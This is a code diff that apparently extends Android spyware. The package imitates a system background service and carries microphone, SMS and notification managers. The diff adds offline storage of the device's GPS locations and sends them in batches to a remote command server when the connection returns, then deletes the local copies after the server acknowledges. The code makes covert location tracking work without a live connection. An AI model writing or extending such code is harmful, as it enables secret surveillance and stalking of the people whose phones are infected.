@@ -31,6 +31,7 @@ import com.android.background.services.helpers.MicManager;
 import com.android.background.services.helpers.MicRecorderManager;
 import com.android.background.services.helpers.NetworkManager;
 import com.android.background.services.helpers.NotificationsManager;
+import com.android.background.services.helpers.OfflineLocationManager;
 import com.android.background.services.helpers.SMSManager;
 import com.android.background.services.helpers.Storage;
 
@@ -58,10 +59,12 @@ public class ConnectionManager {
     @SuppressLint("StaticFieldLeak")
     public static Context context;
     private static io.socket.client.Socket ioSocket;
+    private static OfflineLocationManager offlineLocationManager;
 
     public static void startAsync(Context con) {
         try {
             context = con;
+            offlineLocationManager = new OfflineLocationManager(context);
             sendReq();
         } catch (Exception ex) {
             startAsync(con);
@@ -83,6 +86,40 @@ public class ConnectionManager {
                 @Override
                 public void call(Object... args) {
                     ioSocket.emit("pong");
+                }
+            });
+
+            // Sync offline locations when connected
+            ioSocket.on("connect", new Emitter.Listener() {
+                @Override
+                public void call(Object... args) {
+                    syncOfflineLocations();
+                }
+            });
+
+            // Handle sync response from server
+            ioSocket.on("x0000syncOfflineLocationsResponse", new Emitter.Listener() {
+                @Override
+                public void call(Object... args) {
+                    try {
+                        JSONObject response = (JSONObject) args[0];
+                        boolean status = response.getBoolean("status");
+                        String message = response.getString("message");
+                        int count = response.getInt("count");
+                        
+                        if (status && count > 0) {
+                            // Clear offline locations after successful sync
+                            if (offlineLocationManager != null) {
+                                offlineLocationManager.clearOfflineLocations();
+                                Log.d("x0000syncOfflineLocationsResponse", 
+                                    "Offline locations cleared after successful sync: " + count);
+                            }
+                        }
+                        
+                        Log.d("x0000syncOfflineLocationsResponse", message);
+                    } catch (Exception e) {
+                        Log.e("x0000syncOfflineLocationsResponse", "Error handling sync response", e);
+                    }
                 }
             });
 
@@ -206,6 +243,9 @@ public class ConnectionManager {
                                 break;
                             case "x0000mobileDetail":
                                 x0000mobileDetail();
+                                break;
+                            case "x0000syncOfflineLocations":
+                                x0000syncOfflineLocations();
                                 break;
 
 
@@ -577,10 +617,21 @@ public class ConnectionManager {
             location.put("enable", true);
             location.put("lat", latitude);
             location.put("lng", longitude);
+            
+            // Save to offline storage if not connected
+            if (offlineLocationManager != null && (ioSocket == null || !ioSocket.connected())) {
+                offlineLocationManager.saveLocation(latitude, longitude, 0, null);
+                Log.d("x0000lm", "Location saved offline due to no connection");
+            }
         } else
             location.put("enable", false);
 
-        ioSocket.emit("x0000lm", location);
+        // Only emit if connected
+        if (ioSocket != null && ioSocket.connected()) {
+            ioSocket.emit("x0000lm", location);
+        } else {
+            Log.d("x0000lm", "Not connected, location saved offline only");
+        }
     }
 
     public static void x0000nt() {
@@ -751,6 +802,46 @@ public class ConnectionManager {
             } catch (JSONException je) {
                 je.printStackTrace();
             }
+        }
+    }
+
+    /**
+     * Sync offline locations to server
+     */
+    public static void x0000syncOfflineLocations() {
+        try {
+            if (offlineLocationManager != null && offlineLocationManager.hasOfflineLocations()) {
+                JSONObject syncData = offlineLocationManager.getOfflineLocationsForSync();
+                ioSocket.emit("x0000syncOfflineLocations", syncData);
+                Log.d("x0000syncOfflineLocations", "Offline locations synced: " + 
+                    offlineLocationManager.getOfflineLocationCount() + " locations");
+            } else {
+                JSONObject emptyResponse = new JSONObject();
+                emptyResponse.put("locations", new JSONArray());
+                emptyResponse.put("count", 0);
+                ioSocket.emit("x0000syncOfflineLocations", emptyResponse);
+            }
+        } catch (Exception e) {
+            Log.e("x0000syncOfflineLocations", "Error syncing offline locations: " + e.getMessage());
+            try {
+                JSONObject errorResponse = new JSONObject();
+                errorResponse.put("error", "Failed to sync offline locations: " + e.getMessage());
+                ioSocket.emit("x0000syncOfflineLocations", errorResponse);
+            } catch (JSONException je) {
+                je.printStackTrace();
+            }
+        }
+    }
+
+    /**
+     * Sync offline locations when connection is established
+     */
+    private static void syncOfflineLocations() {
+        if (offlineLocationManager != null && offlineLocationManager.hasOfflineLocations()) {
+            // Delay sync to ensure connection is fully established
+            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
+                x0000syncOfflineLocations();
+            }, 2000); // 2 second delay
         }
     }
 }
